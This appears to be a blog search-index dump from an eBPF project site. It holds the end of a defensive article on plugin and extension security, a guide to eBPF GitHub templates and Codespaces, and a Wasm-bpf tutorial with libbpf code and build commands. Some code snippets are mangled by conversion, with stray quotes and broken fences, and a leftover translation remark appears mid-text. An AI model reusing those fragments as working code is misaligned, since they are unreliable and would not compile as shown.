the database unless allowed.</p> </li> <li> <p>Enforce Least Privilege &amp; Permission Mechanisms: Introduce granular permission models for extensions. Borrow the idea from mobile apps and browser extensions: have extensions declare the resources/actions they need, and restrict them to that. For WordPress, this could mean a plugin has to declare if it needs to write files or execute external commands, and WordPress could then sandbox or flag those that do. For IDEs, an extension that just provides syntax highlighting should not be able to spawn processes \u2013 the IDE could enforce that by API design. Database engines might allow modules to be marked as \u201csafe\u201d or \u201cunsafe,\u201d and only allow certain safe modules in cloud environments. At runtime, perform checks \u2013 e.g., if a low-privileged DB user triggers an extension, ensure the extension cannot perform admin-only calls unless explicitly intended. Capabilities should be narrow: e.g., an image gallery plugin might get permission only to the uploads directory, not the entire file system. By limiting what extensions can do, even if exploited, the damage is contained.</p> </li> <li> <p>Resource Limiting and Monitoring: Implement robust monitoring of extension performance and resource usage. This includes timeouts (CPU time or wall-clock time) for extension code execution, memory quotas to prevent leaks or exhaustion, and perhaps rate limiting of extension-initiated operations (to prevent abuse like an extension spamming network calls or database queries). If an extension hits a limit, the system should log it and safely shut it down or restart it. These limits should be configurable by administrators. For example, allow an admin to say \u201cany extension script must run under 2 seconds and use &lt;100MB memory\u201d. Systems like Redis already use a 5-second script timeout (11: A quick guide to Redis Lua scripting - freeCodeCamp); more platforms should follow suit. Additionally, a watchdog thread can detect if an extension hasn\u2019t responded for a while (possible deadlock) and take action. This would prevent scenarios like the Nginx livelock \u2013 the watchdog could have detected the worker spinning and restarted it. It\u2019s also useful to throttle extension loops to avoid CPU spikes (some JS engines use \u201cfuel counters\u201d that decrement on each operation and stop execution when fuel is exhausted, which could be applied to extension script engines).</p> </li> <li> <p>Secure by Design APIs: Redesign extension interfaces with security in mind. Provide safe, high-level APIs for common tasks so extension developers don\u2019t resort to insecure practices. For instance, offer an API for file upload handling that automatically checks file type and size, rather than each plugin writing its own file upload code (where mistakes happen). In databases, provide parameterized query APIs to extensions to prevent SQL injection. In browsers, continue to restrict dangerous APIs (like no direct eval in extensions content scripts, etc.). Document these APIs clearly in an EIM specification so developers know the right way to perform tasks. The principle is to reduce the chance of developer error leading to vulnerability.</p> </li> <li> <p>Automated Scanning and Auditing: Leverage static analysis and auditing tools on extension code. For ecosystems with centralized repositories (Chrome Web Store, VS Code Marketplace, WordPress plugin repository), incorporate security scanners that check for known vulnerability patterns before publishing or updating an extension. For example, WordPress could scan new plugin submissions for insecure use of <code>eval()</code> or <code>exec</code> calls and flag them. Browser extension stores already do some automated review for malicious patterns; this can be expanded to vulnerability patterns. Additionally, encourage community code audits \u2013 maybe bug bounty programs specifically for popular extensions. Many recent plugin bugs were found by independent security researchers (e.g., ethical hackers auditing WordPress plugins). Supporting and incentivizing this will improve security. Over time, build a knowledge base of common extension weaknesses (like CWE library but focused on extensions) and educate developers.</p> </li> <li> <p>Rapid Update and Incident Response Mechanisms: Since vulnerabilities in extensions will inevitably be found, how quickly users can patch is crucial. Therefore, implement auto-update systems for extensions and consider forced updates or removals for critical vulnerabilities. Browser extension platforms do this \u2013 if an extension is found to be harmful, browser vendors can remotely disable it for users. WordPress introduced an auto-update feature for plugins in recent versions (optional per plugin). These measures ensure that once a fix is available, it propagates fast. Administrators should also subscribe to security advisories for the extensions they use. In enterprise settings, maintain an allow-list of vetted plugins and have a process to evaluate updates. Essentially, treat extensions with the same rigor as core software: track their versions and CVEs.</p> </li> <li> <p>Utilize Extension Signing and Integrity Checks: All extensions should be cryptographically signed by their author and, if possible, vetted by a repository. This prevents tampering and unauthorized code injections into legitimate extensions (which has happened in supply-chain attacks). For example, a VS Code extension update should be signed by the publisher\u2019s key, and VS Code should verify this before enabling the update. This doesn\u2019t stop vulnerabilities but ensures that delivered code is what the developer intended (mitigating the risk of an attacker distributing a tweaked version with a backdoor). Alongside this, maintain a secure distribution channel (official marketplaces with HTTPS and checks) so users aren\u2019t tricked into installing extensions from untrusted sources.</p> </li> <li> <p>Educate and involve extension developers in security: Many extension authors are hobbyists or small teams that may not have security expertise. Platform maintainers (like the WordPress community, browser vendors, etc.) should provide easy-to-follow security guidelines \u2013 essentially an EIM handbook \u2013 with examples of common pitfalls and how to avoid them. For instance, guidance on proper escaping of outputs, using non-blocking patterns to avoid freezing the host, and how to test your extension for vulnerabilities. Providing templates or frameworks can help (e.g., a WordPress plugin template that already includes nonces for form security, so a developer doesn\u2019t accidentally omit them). Also encourage use of vulnerability scanning tools (there are linters and static analyzers specifically for WP plugins, Node packages, etc.). </p> </li> <li> <p>Continuous Improvement of Extension Architecture: Lastly, treat the extension framework itself as evolving software. Just as core software gets updates, the extension system should get security improvements over time (even if it may break backward compatibility). Chrome\u2019s manifest v3 is a case where they significantly changed extension capabilities to improve security (dropping certain dangerous APIs). WordPress might in the future introduce a sandbox mode for plugins or a way to run them with limited PHP <code>open_basedir</code> restrictions, etc. Such changes might inconvenience some legacy plugins but can raise the security baseline. EIM as a formal specification could drive these changes by providing a clear target \u2013 e.g., \u201cby version X, the platform will enforce that all extensions declare permissions and run in user-mode processes.\u201d</p> </li> </ul> <p>In conclusion, extensions and plugins will continue to be a double-edged sword: they are indispensable for flexibility but introduce vulnerabilities. A concerted effort combining better design (like EIM principles of isolation and least privilege) (32: Redefining extensibility in proxies - introducing WebAssembly ... - Istio) ([PDF] eBPF Security Threat Model - Linux Foundation), proactive monitoring, and developer education can significantly reduce the risk. By following the recommendations above, software ecosystems can improve the security posture of their extension frameworks, making incidents like those highlighted in our case studies far less frequent. The goal is to let users enjoy extended functionality without constantly worrying that a single flawed plugin or extension could compromise the entire system. </p> <p>Share on  Share on </p>"},{"location":"blog/2023/07/11/simplifying-ebpf-development-github-templates-and-codespaces-for-online-compilation-and-execution/","title":"Simplifying eBPF Development: GitHub Templates and Codespaces for Online Compilation and Execution","text":"<p>Embarking on the eBPF journey can feel daunting, especially when confronted with setting up the perfect environment or making the ideal language choice. But what if there was a streamlined way to immerse yourself in eBPF without the initial hurdles? Look no further! This guide unveils the magic of GitHub templates combined with GitHub Codespaces, empowering you to seamlessly initiate, compile, and run eBPF projects online. Dive in, click once, and turbocharge your eBPF expedition!</p>"},{"location":"blog/2023/07/11/simplifying-ebpf-development-github-templates-and-codespaces-for-online-compilation-and-execution/#ebpf-unveiling-the-linux-kernels-next-frontier","title":"eBPF: Unveiling the Linux Kernel's Next Frontier","text":"<p>At the heart of the Linux kernel lies eBPF (Extended Berkeley Packet Filter) \u2014 a revolutionary technology designed to dynamically inject and execute bite-sized programs, enriching the kernel's capabilities in realms like networking, security, and performance monitoring. Whether it's TCP/IP, UDP, or ICMP packets, eBPF manages them all, flexing its muscles in both user-space and kernel-space programming. </p> <p>But here's the catch: initiating an eBPF project often comes wrapped in complexities. From deep kernel insights to juggling diverse toolchains, and not to mention the pressing concerns of performance and security, developers can easily find themselves in a maze. But with the tools and insights we're about to share, your eBPF journey is about to get a whole lot smoother.</p>"},{"location":"blog/2023/07/11/simplifying-ebpf-development-github-templates-and-codespaces-for-online-compilation-and-execution/#how-to-swiftly-set-up-an-environment-and-choose-a-programming-language","title":"How to Swiftly Set Up an Environment and Choose a Programming Language?","text":"<p>When looking to create an eBPF project, are you puzzled about setting up the environment or selecting a programming language? Worry not! We've prepared a set of GitHub templates for you, enabling you to swiftly begin a fresh eBPF project. Simply click the <code>Use this template</code> button on GitHub to start.</p>"},{"location":"blog/2023/07/11/simplifying-ebpf-development-github-templates-and-codespaces-for-online-compilation-and-execution/#github-templates-fast-track-your-ebpf-project","title":"GitHub Templates: Fast-Track Your eBPF Project","text":"<p>Setting up the environment and basic configurations are essential yet tedious when you start an eBPF project. To save you time and effort, we've crafted a series of GitHub templates catering to different programming languages and frameworks to meet your varied needs. These templates let you quickly kick off a brand-new eBPF project without building everything from scratch.</p> <ul> <li>libbpf-starter-template: An eBPF project template based on the C language and the libbpf framework.</li> <li>cilium-ebpf-starter-template: An eBPF project template based on the C language and the cilium/ebpf framework.</li> <li>libbpf-rs-starter-template: An eBPF project template based on the Rust language and the libbpf-rs framework.</li> <li>eunomia-template: An eBPF project template based on the C language and the eunomia-bpf framework.</li> </ul> <p>These starter templates come with the following features:</p> <ul> <li>A Makefile that allows you to build the project with one click.</li> <li>A Dockerfile designed for automatically creating a containerized environment for your eBPF project and publishing it to GitHub Packages.</li> <li>GitHub Actions for automating the build, test, and release processes.</li> <li>All dependencies required for eBPF development.</li> </ul> <p>By setting up an existing repository as a template, both you and others can quickly generate new repositories with the same foundational structure. This eliminates the tedious process of manual creation and configuration. GitHub templates offer developers a simple way to kickstart a new project while quickly leveraging best practices and experiences shared by other developers.</p> <p>Once your repository is set as a template, other users can create a new one by:</p> <ol> <li>Opening the template repository page.</li> <li>Clicking on the \"Use this template\" button.</li> <li>Entering the new repository's name and description, and choosing an organization or personal account for its creation.</li> <li>Clicking on the \"Create repository from template\" button to finalize.</li> </ol> <p></p> <p>(Note: If auto-publishing images to GitHub Packages fails in the CI process, you may need to configure action permissions in the repository's Settings. Refer to the later sections for guidance.)</p> <p>With GitHub templates, you can quickly launch a new project, fast-track your understanding of best practices shared by other developers, and focus more on your project's core functionalities and logic, thereby improving development efficiency and code quality. In a GitHub template, you can choose to develop eBPF programs using the C language, Rust, or the eunomia-bpf framework. Additionally, you can utilize GitHub Actions for automating the building, testing, and releasing of eBPF binary and container images. For more detailed information, refer to the official documentation: Official Documentation Link</p>"},{"location":"blog/2023/07/11/simplifying-ebpf-development-github-templates-and-codespaces-for-online-compilation-and-execution/#github-codespaces-compile-ebpf-programs-in-the-cloud","title":"GitHub Codespaces: Compile eBPF Programs in the Cloud","text":"<p>GitHub Codespaces is a cloud-based development environment that offers rapid and flexible capabilities to compile and run eBPF programs. No more local software installations and configurations; you can easily build and debug eBPF programs using GitHub's primary services.</p> <p>Within Codespaces, each code repository has a corresponding Docker container containing all the tools and dependencies needed for your project. You can connect to Codespaces via a browser, Visual Studio Code, or JetBrains Gateway, accessing a fully customizable cloud-based development environment.</p> <p>Developing eBPF programs with GitHub Codespaces is straightforward:</p> <ol> <li>Open your eBPF project repository.</li> <li>Click on the \"Code\" button and then select the \"Open with Codespaces\" option.</li> </ol> <p></p> <ol> <li>GitHub will create a new Codespace for you, which will be equipped with all the required tools and dependencies for your project. This may take a few minutes, depending on your network speed and the repository size.</li> <li>Once your Codespace is ready, you can open the terminal, navigate to your project directory, and begin compiling and running your eBPF program.</li> </ol> <p></p> <p>Using GitHub Codespaces, you can bypass environmental setup, version compatibility issues, and always employ the latest development tools and frameworks. There's no need to worry about system hardware limitations, performance issues, or being confined to a particular location or device. With Codespaces, you can solely focus on coding and the project's core functionalities, enhancing development efficiency and code quality, ensuring faster and more efficient project progression. For more details, refer to: GitHub Codespaces Link</p>"},{"location":"blog/2023/07/11/simplifying-ebpf-development-github-templates-and-codespaces-for-online-compilation-and-execution/#run-ebpf-program-with-docker-in-one-step","title":"Run eBPF Program with Docker in One Step","text":"<p>Write code in codespace, and upon submission, Github Actions will compile and automatically publish a container image. To use the automated image publishing feature, configure actions permissions in the repository's Settings:</p> <p></p> <p>Next, you can run the eBPF program anywhere with docker in one step, like this:</p> <p><code>sudo docker run --rm -it --privileged ghcr.io/eunomia-bpf/libbpf-rs-template:latest</code></p> <p></p>"},{"location":"blog/2023/07/11/simplifying-ebpf-development-github-templates-and-codespaces-for-online-compilation-and-execution/#conclusion","title":"Conclusion","text":"<p>In the development of eBPF projects, we introduced how to quickly set up the environment, choose programming languages, and how to use the GitHub template to start projects. This saves a lot of time and effort for developers, allowing them to focus on creating core features and business logic. However, this is just a small part of the eBPF field. The eunomia-bpf community provides a development framework for eBPF and Wasm programs to make it easier for you to build, distribute, and deploy eBPF programs. Eunomia-bpf is committed to simplifying the writing, distribution, and dynamic loading of eBPF programs, as well as exploring the combination of eBPF and Wasm toolchains and runtimes:</p> <ul> <li>Github: https://github.com/eunomia-bpf</li> <li>Website: https://eunomia.dev</li> </ul> <p>We also have some other projects:</p> <ul> <li>wasm-bpf: A WebAssembly library, toolchain, and runtime designed specifically for eBPF programs, allowing for the building of Wasm user-space interactive programs.</li> <li>bpf-developer-tutorial: An open-source eBPF developer tutorial and knowledge base, offering a set of utilities to help beginners understand the various uses and tricks of eBPF.</li> <li>GPTtrace: Tools for generating eBPF programs and traces using ChatGPT and natural language.</li> </ul> <p>With the GitHub template and Codespaces, eBPF development has become more efficient, simpler, and reliable. You no longer need to waste time and energy configuring environments, choosing programming languages, or resolving compatibility issues. Instead, you can focus on creating more efficient and superior eBPF programs. We thank the eBPF community and GitHub for providing these powerful tools and support, enabling us to develop eBPF projects more easily and promote the development and application of this emerging technology. We believe that as more developers join the eBPF community, together we can build a smarter, more efficient, and reliable network and cloud-native application ecosystem. If you have any questions or suggestions about eBPF development, please feel free to contact us. We are always eager to communicate and share experiences.</p> <p>Share on  Share on </p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%92%8C%E4%BD%BF%E7%94%A8-libbpf/","title":"\u5728 WebAssembly \u4e2d\u7f16\u5199 eBPF \u7a0b\u5e8f\u548c\u4f7f\u7528 libbpf","text":"<p>Authors: Yu Tong, Zheng Yusheng</p> <p>eBPF (extended Berkeley Packet Filter) is a high-performance kernel virtual machine that runs in the kernel space and is used to collect system and network information. With the continuous development of computer technology, eBPF has become increasingly powerful and is used to build various efficient online diagnostic and tracing systems, as well as secure networks and service meshes.</p> <p>WebAssembly (Wasm) was initially developed for browser security sandbox purposes. As of now, WebAssembly has evolved into a high-performance, cross-platform, and multi-language software sandbox environment for cloud-native software components. The lightweight nature of Wasm containers makes them suitable for running as the next-generation serverless platform runtime or for efficient execution in resource-constrained scenarios such as edge computing.</p> <p>Now, with the help of the Wasm-bpf compilation toolchain and runtime, we can use Wasm to write eBPF programs as cross-platform modules, while using C/C++ or Rust to write Wasm programs. By using eBPF programs in WebAssembly, we not only enable Wasm applications to benefit from the high performance and access to system interfaces of eBPF, but also allow eBPF programs to leverage the sandboxing, flexibility, cross-platform nature, and dynamic loading of Wasm. Additionally, we can conveniently and quickly distribute and manage eBPF programs using Wasm OCI images. Combining these two technologies will provide a completely new development experience for the eBPF and Wasm ecosystems!</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%92%8C%E4%BD%BF%E7%94%A8-libbpf/#writing-dynamically-loading-and-distributing-ebpf-programs-in-wasm-with-the-wasm-bpf-toolchain","title":"Writing, Dynamically Loading, and Distributing eBPF Programs in Wasm with the Wasm-bpf Toolchain","text":"<p>Wasm-bpf is a new open-source project: https://github.com/eunomia-bpf/wasm-bpf. It defines an abstraction for the eBPF-related system interfaces and provides a corresponding development toolchain, library, and a general Wasm + eBPF runtime instance. It can provide a similar development experience to libbpf-bootstrap, automatically generating skeleton header files and data structure definitions for unordered communication between Wasm and eBPF. With this toolchain, you can easily build your own Wasm-eBPF runtime in any language on any platform. For more details, please refer to our previous blog post: Wasm-bpf: Bridging WebAssembly and eBPF Kernel Programmability.</p> <p>With Wasm, we can build eBPF applications using multiple languages and manage and distribute them in a unified and lightweight manner. As an example, our sample application bootstrap.wasm is only ~90K in size, making it easy to distribute over the network and dynamically deploy, load, and run on another machine in less than 100ms, while retaining the isolation characteristics of lightweight containers. The runtime does not require kernel headers, LLVM, clang, or any resource-consuming heavy compilation work.</p> <p>This article will discuss writing and compiling eBPF programs in C/C++ and converting them into Wasm modules. A specific example of writing and compiling eBPF programs in Rust and converting them into Wasm modules will be described in the next article.</p> <p>We provide several sample programs in the repository, each corresponding to different scenarios such as observability, networking, and security.</p>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%92%8C%E4%BD%BF%E7%94%A8-libbpf/#writing-ebpf-programs-in-cc-and-compiling-into-wasm","title":"Writing eBPF Programs in C/C++ and Compiling into Wasm","text":"<p>libbpf is a C/C++ user space loading and control library for eBPF and has become the de facto API standard for eBPF user space. libbpf also supports the CO-RE (Compile Once - Run Everywhere) solution, which allows precompiled BPF code to work on different kernel versions without the need to recompile for each specific kernel. We aim to maintain compatibility and minimize migration costs to Wasm (if necessary) by keeping the user space API and behavior consistent with libbpf.</p> <p>libbpf-bootstrap provides templates for generating libbpf-based BPF programs, making it easy for developers to generate custom BPF programs. In general, outside the Wasm sandbox, using the libbpf-bootstrap scaffolding, you can quickly and easily build BPF applications using C/C++.</p> <p>The compilation, building, and running of eBPF programs (regardless of the programming language) usually involve the following steps:</p> <ul> <li>Write the code for the kernel space eBPF program, generally using C/C++ or Rust.</li> <li>Compile the eBPF program using the clang compiler or related toolchains (including BTF information to achieve cross-kernel version portability).</li> <li>In the user space development program, write the corresponding logic for loading, controlling, mounting, and processing data.</li> <li>During runtime, load the eBPF program into the kernel from the user space and execute it.</li> </ul>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%92%8C%E4%BD%BF%E7%94%A8-libbpf/#bootstrap","title":"bootstrap","text":"<p><code>bootstrap</code> is a simple (but practical) example of a BPF application. It tracks the startup (specifically, the <code>exec()</code> series of system calls) and exit of processes, and sends data about the file name, PID, and parent PID, as well as the exit status and duration of the process. With <code>-d &lt;min-duration-ms&gt;</code>, you can specify the minimum duration of the processes to be recorded.</p> <p><code>bootstrap</code> is created based on the similar idea of libbpf-tools in the BCC package, but it is designed to be more independent and has a simpler Makefile to simplify user's specific needs. It demonstrates typical BPF features, including cooperation with multiple BPF program segments, maintaining state using BPF maps, sending data to userspace using BPF ring buffer, and parameterizing application behavior using global variables.</p> <p>Here is an example output of running <code>bootstrap</code> by compiling it with Wasm:</p> <pre><code>$ sudo sudo ./wasm-bpf bootstrap.wasm -h\nBPF bootstrap demo application.\n\nIt traces process start and exits and shows associated\ninformation (filename, process duration, PID and PPID, etc).\n\nUSAGE: ./bootstrap [-d &lt;min-duration-ms&gt;] -v\n$ sudo ./wasm-bpf bootstrap.wasm\nTIME     EVENT COMM             PID     PPID    FILENAME/EXIT CODE\n18:57:58 EXEC  sed              74911   74910   /usr/bin/sed\n18:57:58 EXIT  sed              74911   74910   [0] (2ms)\n18:57:58 EXIT  cat              74912   74910   [0] (0ms)\n18:57:58 EXEC  cat              74913   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74913   74910   [0] (0ms)\n18:57:59 EXEC  cat              74914   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74914   74910   [0] (0ms)\n18:57:59 EXEC  cat              74915   74910   /usr/bin/cat\n18:57:59 EXIT  cat              74915   74910   [0] (1ms)\n18:57:59 EXEC  sleep            74916   74910   /usr/bin/sleep\n</code></pre> <p>We can provide a development experience similar to libbpf-bootstrap. Just run <code>make</code> to build the wasm binary:</p> <pre><code>git clone https://github.com/eunomia-bpf/wasm-bpf --recursive\ncd examples/bootstrap\nmake\n</code></pre>"},{"location":"blog/2022/02/11/%E5%9C%A8-webassembly-%E4%B8%AD%E7%BC%96%E5%86%99-ebpf-%E7%A8%8B%E5%BA%8F%E5%92%8C%E4%BD%BF%E7%94%A8-libbpf/#writing-ebpf-programs-in-kernel-space","title":"Writing eBPF programs in kernel space","text":"<p>To build a complete eBPF program, you need to first write the BPF code in kernel space. This is typically done using the C language and compiled using clang:</p> <pre><code>char LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, pid_t);\n    __type(value, u64);\n} exec_start SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\".const volatile unsigned long long min_duration_ns = 0;\nconst volatile int *name_ptr;\n\nSEC(\"tp/sched/sched_process_exec\")\nint handle_exec(struct trace_event_raw_sched_process_exec *ctx)\n{\n    struct task_struct *task;\n    unsigned fname_off;\n    struct event *e;\n    pid_t pid;\n    u64 ts;\n....\n</code></pre> <p>Due to space constraints, the full code is not shown here. The way to write kernel code is exactly the same as other libbpf-based programs. Generally, it includes some global variables, eBPF functions declared with <code>SEC</code> for mounting points, and map objects used to store state or communicate between user space and kernel space (we are also doing other work in progress: bcc to libbpf converter, and once it is completed, you will be able to compile BCC-style eBPF kernel code in this way). After writing the eBPF program, running <code>make</code> will invoke clang and llvm-strip in the <code>Makefile</code> to build the BPF program and remove debug information:</p> <pre><code>clang -g -O2 -target bpf -D__TARGET_ARCH_x86 -I../../third_party/vmlinux/x86/ -idirafter /usr/local/include -idirafter /usr/include -c bootstrap.bpf.c -o bootstrap.bpf.o\nllvm-strip -g bootstrap.bpf.o # strip useless DWARF info\n</code></pre> <p>Then we provide a specialized bpftool for Wasm, which generates C header files from BPF programs:</p> <pre><code>../../third_party/bpftool/src/bpftool gen skeleton -j bootstrap.bpf.o &gt; bootstrap.skel.h\n</code></pre> <p>Since the C memory layout for eBPF itself is the same as the instruction set of the current machine, but Wasm has a specific memory layout (e.g., the current machine is 64-bit, and the Wasm virtual machine is 32-bit, so the C struct layout, pointer width, endianness, etc. may be different), in order to ensure that eBPF programs can communicate correctly with Wasm, we need to customize a specialized bpftool and other tools to generate a user space development framework that can work in Wasm.</p> <p>The skeleton contains a skeleton for a BPF program, used to manipulate BPF objects and control the lifecycle of the BPF program, for example:</p> <pre><code>    struct bootstrap_bpf {\n        struct bpf_object_skeleton *skeleton;\n        struct bpf_object *obj;\n        struct {\n            struct bpf_map *exec_start;\n            struct bpf_map *rb;\n            struct bpf_map *rodata;\n        } maps;\n        struct {\n            struct bpf_program *handle_exec;\n            struct bpf_program *handle_exit;\n        } progs;\n        struct bootstrap_bpf__rodata {\n            unsigned long long min_duration_ns;\n        } *rodata;\n        struct bootstrap_bpf__bss {\n            uint64_t /* pointer */ name_ptr;\n        } *bss;\n    };\n</code></pre> <p>We will convert all pointers to integers based on the pointer size of the eBPF program's target instruction set, for example, <code>name_ptr</code>. In addition, padding bytes will be explicitly added to the structure to ensure that the structure layout matches the target, for example using <code>char __pad0[4];</code>. We will also use <code>static_assert</code> to ensure that the size of the structure matches the type length in the original BTF (BPF Type Format) information.### Building User-Space Wasm Code and Accessing Kernel-Space Data</p> <p>We assume the use of wasi-sdk to build the wasm binary from C/C++ code. You can also use the emcc toolchain to build the wasm binary, and the commands should be similar. You can run the following command to install wasi-sdk:</p> <pre><code>wget https://github.com/WebAssembly/wasi-sdk/releases/download/wasi-sdk-17/wasi-sdk-17.0-linux.tar.gz\ntar -zxf wasi-sdk-17.0-linux.tar.gz\nsudo mkdir -p /opt/wasi-sdk/ &amp;&amp; sudo mv wasi-sdk-17.0/* /opt/wasi-sdk/\n</code></pre> <p>Then running <code>make</code> will compile the C code to generate the Wasm bytecode in the <code>Makefile</code> using wasi-clang:</p> <pre><code>/opt/wasi-sdk/bin/clang -O2 --sysroot=/opt/wasi-sdk/share/wasi-sysroot -Wl,--allow-undefined -o bootstrap.wasm bootstrap.c\n</code></pre> <p>Since the C structure layout on the host (or eBPF side) might be different from the target (Wasm side), you can use ecc and our wasm-bpftool to generate the C header file for the user-space code:</p> <pre><code>ecc bootstrap.h --header-only\n../../third_party/bpftool/src/bpftool btf dump file bootstrap.bpf.o format c -j &gt; bootstrap.wasm.h\n</code></pre> <p>For example, the original kernel-side header file contains the following structure definition:</p> <pre><code>struct event {\n    int pid;\n    int ppid;\n    unsigned exit_code;\n    unsigned long long duration_ns;\n    char comm[TASK_COMM_LEN];\n    char filename[MAX_FILENAME_LEN];\n    char exit_event;\n};\n</code></pre> <p>Our tool will transform it to:</p> <pre><code>struct event {\n    int pid;\n    int ppid;\n    unsigned int exit_code;\n    char __pad0[4];\n    unsigned long long duration_ns;\n    char comm[16];\n    char filename[127];\n    char exit_event;\n} __attribute__((packed));\nstatic_assert(sizeof(struct event) == 168, \"Size of event is not 168\");\n</code></pre> <p>Note: This process and tool are not always necessary. For simple applications, you can do it manually. For cases where both kernel-side and Wasm applications use C/C++ languages, you can manually write all event structure definitions, use <code>__attribute__((packed))</code> to avoid padding bytes, and convert all pointers between the host and Wasm side to the correct integers. All types must have the same size and layout as the host on the Wasm side.</p> <p>For complex programs, manually confirming the correct memory layout is difficult. Therefore, we have created a Wasm-specific <code>bpftool</code> that generates a C header file containing all type definitions and the correct structure layout from <code>BTF</code> information for user-space code. By using a similar approach, you can convert all structure definitions in the eBPF program to the memory layout on the Wasm side at once, ensuring endianness consistency to access correctly.</p> <p>For cases where Wasm is not developed using the C language, with the help of Wasm's component model, we can also output these BTF information structure definitions as wit type declarations, and then use the wit-bindgen tool in user-space code to generate type definitions for multiple languages (such as C/C++/Rust/Go) at once. This will be described in detail in the section on how to write eBPF programs in Rust in Wasm, and we will continue to improve these steps and toolchains to enhance the programming experience of Wasm-bpf programs.</p> <p>We provide a libbpf API library for Wasm programs that includes only header files. You can find it in libbpf-wasm.h (wasm-include/libbpf-wasm.h), which contains some commonly used user-space libbpf APIs and type definitions. Wasm programs can use the libbpf API to manipulate BPF objects, for example:</p> <p>```c\"./ Load and verify BPF application / skel = bootstrap_bpf__open(); / Parameterize BPF code with minimum duration parameter / skel-&gt;rodata-&gt;min_duration_ns = env.min_duration_ms * 1000000ULL; / Load &amp; verify BPF programs / err = bootstrap_bpf__load(skel); / Attach tracepoints / err = bootstrap_bpf__attach(skel);</p> <p>The rodata section is used to store constants in the BPF program, and these values will be mapped to the correct offsets in the object file generated by bpftool gen skeleton. After opening, the values can be modified through memory mapping, so there is no need to compile the libelf library in Wasm. The BPF object can still be dynamically loaded and manipulated at runtime.</p> <p>The C code on the Wasm side is slightly different from the local libbpf code, but it can provide most of the functionalities from the eBPF side. For example, polling from a ring buffer or perf buffer, accessing maps from both the Wasm and eBPF sides, loading, attaching, and detaching BPF programs, etc. It can support a wide range of eBPF program types and maps, covering most use cases of eBPF programs in domains such as tracing, networking, and security.</p> <p>Due to the lack of certain functionalities on the Wasm side, such as signal handler support (as of February 2023), the original C code may not be directly compilable to wasm. You may need to make slight modifications to the code to make it work. We will make best efforts to make the libbpf API on the wasm side as similar as possible to the libbpf API typically used in user space so that user space code can be directly compiled to wasm in the future. We will also provide more language bindings (e.g., Go) for wasm-based eBPF program development libraries as soon as possible.</p> <p>You can use the polling API in user space programs to retrieve data uploaded from kernel space. It is a wrapper for the ring buffer and perf buffer, allowing user space code to use the same API to poll events from either a ring buffer or a perf buffer, depending on the type specified in the BPF program. For example, ring buffer polling is defined as <code>BPF_MAP_TYPE_RINGBUF</code>:</p> <pre><code>struct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n</code></pre> <p>You can use the following code in user space to poll events from the ring buffer:</p> <pre><code>rb = bpf_buffer__open(skel-&gt;maps.rb, handle_event, NULL);\n/* Process events */\nprintf(\"%-8s %-5s %-16s %-7s %-7s %s\\n\", \"TIME\", \"EVENT\", \"COMM\", \"PID\",\n       \"PPID\", \"FILENAME/EXIT CODE\");\nwhile (!exiting) {\n    // poll buffer\n    err = bpf_buffer__poll(rb, 100 /* timeout, ms */);\n</code></pre> <p>Ring buffer polling does not require serialization overhead. The bpf_buffer__poll API will call the handle_event callback function to process event data from the ring buffer:</p> <pre><code>static int\nhandle_event(void *ctx, void *data, size_t data_sz)\n{\n    const struct event *e = data;\n    ...\n    if (e-&gt;exit_event) {\n        printf(\"%-8s %-5s %-16s %-7d %-7d [%u]\", ts, \"EXIT\", e-&gt;comm, e-&gt;pid,\n               e-&gt;ppid, e-&gt;exit_code);\n        if (e-&gt;duration_ns)\n            printf(\" (%llums)\", e-&gt;duration_ns / 1000000);\n        printf(\"\\n\");\n    }\n    ...\n    return 0;\n}\n```The Markdown content has been translated to English while preserving the original formatting:\n\n\"Runtime is based on the libbpf CO-RE (Compile Once, Run Everywhere) API, which is used to load BPF objects into the kernel. Therefore, wasm-bpf programs are not affected by the kernel version they are compiled with and can run on any kernel version that supports BPF CO-RE.\n\n### Accessing and updating map data of eBPF programs from user-space programs\n\nrunqlat is a more complex example that shows the scheduler run queue latency through a histogram, displaying how long a task has waited to run.\n\n```console\n$ sudo ./wasm-bpf runqlat.wasm -h\nSummarize run queue (scheduler) latency as a histogram.\n\nUSAGE: runqlat [--help] [interval] [count]\n\nEXAMPLES:\n    runqlat         # summarize run queue latency as a histogram\n    runqlat 1 10    # print 1 second summaries, 10 times\n$ sudo ./wasm-bpf runqlat.wasm 1\n\nTracing run queue latency... Hit Ctrl-C to end.\n\n     usecs               : count    distribution\n         0 -&gt; 1          : 72       |*****************************           |\n         2 -&gt; 3          : 93       |*************************************   |\n         4 -&gt; 7          : 98       |****************************************|\n         8 -&gt; 15         : 96       |*************************************** |\n        16 -&gt; 31         : 38       |***************                         |\n        32 -&gt; 63         : 4        |*                                       |\n        64 -&gt; 127        : 5        |**                                      |\n       128 -&gt; 255        : 6        |**                                      |\n       256 -&gt; 511        : 0        |                                        |\n       512 -&gt; 1023       : 0        |                                        |\n      1024 -&gt; 2047       : 0        |                                        |\n      2048 -&gt; 4095       : 1        |                                        |\n</code></pre> <p>In runqlat, the <code>map</code> API is used to access and directly read data from a <code>map</code> in the kernel from user-space, for example:</p> <pre><code>    while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n        err = bpf_map_lookup_elem(fd, &amp;next_key, &amp;hist);\n        ...\n        lookup_key = next_key;\n    }\n    lookup_key = -2;\n    while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n        err = 